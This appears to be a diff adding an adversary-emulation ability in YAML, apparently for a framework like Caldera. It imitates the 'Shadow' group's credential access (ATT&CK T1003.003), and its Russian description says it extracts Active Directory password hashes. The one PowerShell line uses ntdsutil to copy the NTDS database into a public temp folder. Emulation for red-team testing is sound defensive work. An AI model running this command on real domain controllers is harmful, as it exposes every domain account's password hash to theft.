@@ -1,0 +1,13 @@
+- id: 612b6cfa-4ebe-4e50-bb1f-9feff9f4aaab
+  name: "[SHADOW-TWELVE] NTDSUtil usage"
+  description: "Shadow использует утилиту NTDSUtil для получения доступа к базе данных Active Directory и извлечения хешей паролей"
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: "NTDS"
+  platforms:
+    windows:
+      psh:
+        command: |
+          powershell ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\Users\Public\Temp\log' q q;
+        timeout: 60
